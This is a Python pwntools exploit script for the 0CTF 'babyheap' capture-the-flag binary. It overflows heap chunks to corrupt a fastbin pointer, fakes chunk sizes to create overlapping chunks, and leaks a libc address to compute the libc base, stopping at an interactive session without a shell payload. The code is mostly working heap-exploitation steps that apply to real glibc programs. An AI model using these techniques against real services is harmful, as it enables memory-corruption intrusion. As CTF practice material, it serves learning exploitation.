#!/usr/bin/env python
from pwn import *
import sys

context.terminal = ['tmux','splitw','-h']
context.log_level = 'debug'
gdb_bool = True

#gdb_bool = False


def alloc(size):
    r.sendline("1")
    r.recvuntil("Size: ")
    r.sendline(str(size))
    r.recvuntil("Command: ")

def fill(index,size,content):
    r.sendline("2")
    r.recvuntil("Index: ")
    r.sendline(str(index))
    r.recvuntil("Size: ")
    r.sendline(str(size))
    r.recvuntil("Content: ")
    r.sendline(content)
    r.recvuntil("Command: ")

def dump(index):
    r.sendline("4")
    r.recvuntil("Index: ")
    r.sendline(str(index))
    r.recvuntil("Content: \n")
    leak = u64(r.recvn(6)+"\x00\x00")
    r.recvuntil("Command: ")
    return leak
def free(index):
    r.sendline('3')
    r.sendlineafter(': ', str(index))
    r.recvuntil(': ')

def exit():
    r.sendline("5")


def exploit(r):


    r.recvuntil("Command: ")
    
    alloc(0x20) #[0]
    alloc(0x20) #[1] - > freed 1st : ac4030  #this chunk is killed since it was in the freed and never allocd back since we overwrote the FD of [2]
    alloc(0x20) #[2] - > freed 2nd : ac4060
    alloc(0x20) #[3]
    alloc(0x80) #[4]
    alloc(0x20) #[5]
    free(1)
    free(2)

    
    #fastbin will have two chunks in it
    #we can use fill to overwrite the fd in the second freed fastbin
    payload = ""
    payload += (p64(0)*5 + p64(0x31))*2
    payload += p8(0xc0)
    fill(0,len(payload),payload)


    #now we have corrupted the FD of the fastbin up to be alloced
    #but we must also change the size of the small chunk to 0x31 so that we can malloc it as a fastbin 
    payload =""
    payload += p64(0)*5 + p64(0x31)
    fill(3,len(payload),payload)

    #now the small bin is in the freelist with a fake size of 0x31 we can alloc twice to get it in use
    alloc(0x20)
    alloc(0x20) #given index[2] because the orginal index 2 got overwriten with the small chunk


    #now at 0xc0 we have both a fastbin and small bin
    #to populate the FD field to get a libc leak we need to free it
    #but we cannot free it currently because the size is still 0x31
    #so we can use fill to restore the size of 0x91
    payload =""
    payload += p64(0)*5 + p64(0x91)
    fill(3,len(payload),payload)
    free(4)
    '''
    fill(0,4,"AAAA")
    fill(1,4,"BBBB")
    fill(2,4,"CCCC")
    '''

    #we can now dump [2] since it is a free bin located ontop of of the small bin which we just freed
    leak = dump(2)
    log.info("Leaked address: %s" % hex(leak))
    #hex(0x7f1027f97b78(leaked address)-0x7f1027bd3000(libc loaded)) = '0x3c4b78L'
    libc_base = leak - 0x3c4b78
    log.info("Libc Base: %s" % hex(libc_base))

    r.interactive()
    return


if __name__ == "__main__":
    log.info("For remote %s HOST PORT" % sys.argv[0])
    
    binary_name = "./0ctfbabyheap"        #put binary name here
    e = ELF(binary_name)

    if len(sys.argv) > 1:
        r = remote(sys.argv[1], int(sys.argv[2]))
        exploit(r)
    else:
        r = process(binary_name)
        print util.proc.pidof(r)
        gdb_cmd = [
            "c"


        ]
        if(gdb_bool):
            gdb.attach(r, gdbscript = "\n".join(gdb_cmd))
            #r =gdb.debug(binary_name, gdbscript = "\n".join(gdb_cmd))
        #r = process("./LOLgame", env={"LD_PRELOAD" : "./libc.so.6.remote"})
        #pause()
        exploit(r)

